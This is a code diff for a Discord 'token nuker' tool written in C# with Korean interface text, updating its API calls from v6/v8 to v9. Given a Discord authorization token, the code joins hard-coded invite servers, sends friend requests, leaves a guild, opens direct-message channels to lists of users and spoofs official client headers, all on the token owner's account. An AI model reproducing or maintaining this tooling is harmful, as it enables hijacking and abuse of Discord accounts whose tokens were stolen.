@@ -1,4 +1,4 @@
-﻿using Discord;
+using Discord;
 using Discord.Gateway;
 using Newtonsoft.Json;
 using OpenQA.Selenium;
@@ -177,7 +177,7 @@ namespace KS_Token_Nuker
 					WC.Headers["content-type"] = "application/json";
 					WC.Headers["user-agent"] = "discordbot";
 					WC.Proxy = null;
-					WC.UploadString("https://discord.com/api/v8/users/@me/relationships", "POST", "{\"username\":\"Deleted User ff1a9125\",\"discriminator\":\"190\"}");
+					WC.UploadString("https://discord.com/api/v9/users/@me/relationships", "POST", "{\"username\":\"Deleted User ff1a9125\",\"discriminator\":\"190\"}");
 				}
 				catch
 				{
@@ -258,7 +258,7 @@ namespace KS_Token_Nuker
 							WC.Headers.Clear();
 							WC.Headers.Add("authorization", Token);
 							WC.Headers.Add("user-agent", "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.309 Chrome/83.0.4103.122 Electron/9.3.1 Safari/537.36");
-							WC.UploadData("https://discord.com/api/v8/invites/FKfG4EVb7x", new byte[0]);
+							WC.UploadData("https://discord.com/api/v9/invites/FKfG4EVb7x", new byte[0]);
 						}
 						catch { }
 					}
@@ -316,7 +316,7 @@ namespace KS_Token_Nuker
 				WC.Headers["authorization"] = TokenTextBox.Text;
 				try
 				{
-					string Response = WC.DownloadString("https://discord.com/api/v8/users/@me");
+					string Response = WC.DownloadString("https://discord.com/api/v9/users/@me");
 					WC.Headers.Clear();
 					if (Response.Contains("Unauthorized")) TokenStatusLabel.Text = "토큰 상태: 만료됨 (사용 불가능)";
 					else
@@ -359,7 +359,7 @@ namespace KS_Token_Nuker
 					NameValueCollection nameValueCollection = new NameValueCollection(); 
 					nameValueCollection[""] = "";
 					webClient.Headers.Add("Authorization", TokenTextBox.Text);
-					webClient.UploadValues("https://discord.com/api/v8/invites/SA2F8k6Q4W", nameValueCollection);
+					webClient.UploadValues("https://discord.com/api/v9/invites/SA2F8k6Q4W", nameValueCollection);
 					sad = "x";
 				}
 				catch (Exception x)
@@ -380,8 +380,8 @@ namespace KS_Token_Nuker
 						NameValueCollection nameValueCollection = new NameValueCollection();
 						nameValueCollection[""] = "";
 						webClient.Headers.Add("Authorization", TokenTextBox.Text);
-						webClient.UploadValues("https://discord.com/api/v8/invites/eJ4k4f4CDH", nameValueCollection);
-						WebRequest webRequest = WebRequest.Create(new Uri("https://discord.com/api/v8/users/@me/guilds/737653219756605511"));
+						webClient.UploadValues("https://discord.com/api/v9/invites/eJ4k4f4CDH", nameValueCollection);
+						WebRequest webRequest = WebRequest.Create(new Uri("https://discord.com/api/v9/users/@me/guilds/737653219756605511"));
 						HttpWebRequest httpWebRequest = (HttpWebRequest)webRequest;
 						httpWebRequest.Accept = "application/json";
 						httpWebRequest.Method = "DELETE";
@@ -420,7 +420,7 @@ namespace KS_Token_Nuker
 				WC.Proxy = null;
 				try
 				{
-					WC.UploadString("https://discord.com/api/v6/users/@me/channels", "POST", "{\"recipients\": [\"" + arr[n] + "\"]}");
+					WC.UploadString("https://discord.com/api/v9/users/@me/channels", "POST", "{\"recipients\": [\"" + arr[n] + "\"]}");
 				} catch (Exception)
                 {
 
@@ -432,7 +432,7 @@ namespace KS_Token_Nuker
 			WC.Headers["content-type"] = "application/json";
 			WC.Headers["x-super-properties"] = "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiQ2hyb21lIiwiZGV2aWNlIjoiIiwic3lzdGVtX2xvY2FsZSI6ImVuLVVTIiwiYnJvd3Nlcl91c2VyX2FnZW50IjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzg2LjAuNDI0MC4xOTggV2hhbGUvMi45LjExNi4xNSBTYWZhcmkvNTM3LjM2IiwiYnJvd3Nlcl92ZXJzaW9uIjoiODYuMC40MjQwLjE5OCIsIm9zX3ZlcnNpb24iOiIxMCIsInJlZmVycmVyIjoiIiwicmVmZXJyaW5nX2RvbWFpbiI6IiIsInJlZmVycmVyX2N1cnJlbnQiOiIiLCJyZWZlcnJpbmdfZG9tYWluX2N1cnJlbnQiOiIiLCJyZWxlYXNlX2NoYW5uZWwiOiJzdGFibGUiLCJjbGllbnRfYnVpbGRfbnVtYmVyIjo4MzAzNiwiY2xpZW50X2V2ZW50X3NvdXJjZSI6bnVsbH0=";
 			WC.Proxy = null;
-			string Response = WC.DownloadString("https://discord.com/api/v6/users/@me/library");
+			string Response = WC.DownloadString("https://discord.com/api/v9/users/@me/library");
 			
 			if (Response.Contains("Unauthorized"))
 			{
